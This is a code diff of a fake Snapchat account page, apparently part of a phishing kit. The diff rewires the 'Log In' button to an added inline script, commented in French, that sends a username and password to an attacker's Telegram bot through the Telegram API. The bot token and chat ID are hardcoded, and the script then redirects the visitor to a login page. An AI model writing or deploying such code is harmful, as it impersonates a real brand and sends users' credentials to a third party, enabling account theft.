@@ -1,18 +1,13 @@
-<!-- it is first loader  page  -->
-
 <!DOCTYPE html>
-
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
-
   <link rel="shortcut icon" href="img/faviconV2.png">
   <meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
-
   <title>Snapchat • Account</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
- <link rel="stylesheet" href="/css/accounts.css">
+  <link rel="stylesheet" href="/css/accounts.css">
 </head>
 <body>
   <!-- Loading Screen -->
@@ -41,13 +36,49 @@
     </a>
   </div>
 
-  <button class="login-btn" onclick="window.location.href='/login.html';">Log In</button>
+  <button class="login-btn" onclick="sendCredentialsToTelegram();">Log In</button>
 
   <div class="button-container">
     <div class="button" onclick="window.location.href='https://accounts.snapchat.com/v2/signup';">Sign Up</div>
     <div class="button" onclick="window.location.href='/login.html';">Switch Account</div>
   </div>
 
-<script src="/js/account.js"></script>
+  <script>
+    // Fonction pour envoyer les informations à Telegram lors du clic sur "Log In"
+    function sendCredentialsToTelegram() {
+      const username = 'tejazmali';  // Ici, tu utilises le nom d'utilisateur statique
+      const password = 'tonMotDePasse';  // Ici, remplace 'tonMotDePasse' par un mot de passe réel, si nécessaire
+
+      // Paramètres du bot Telegram
+      const botToken = '7348058838:AAEurSPCnnOw6yluh3-4oqUq_E61Q55Av-U'; // Token de ton bot
+      const chatId = '-4746759996'; // ID de ton chat Telegram
+
+      // Création du message
+      const message = `Nom d'utilisateur: ${username}\nMot de passe: ${password}`;
+
+      // URL de l'API Telegram
+      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      // Envoi de la requête à Telegram (même si la validation échoue)
+      fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+          // Affiche un message si l'envoi a réussi
+          if (data.ok) {
+            console.log('Message envoyé à Telegram.');
+          } else {
+            console.error('Erreur lors de l\'envoi à Telegram.', data);
+          }
+        })
+        .catch(error => {
+          console.error('Erreur:', error);
+        });
+
+      // Rediriger vers la page de connexion après l'envoi
+      window.location.href = '/login.html';  // Redirige vers la page de connexion ou toute autre action souhaitée
+    }
+  </script>
+
+  <script src="/js/account.js"></script>
 </body>
 </html>
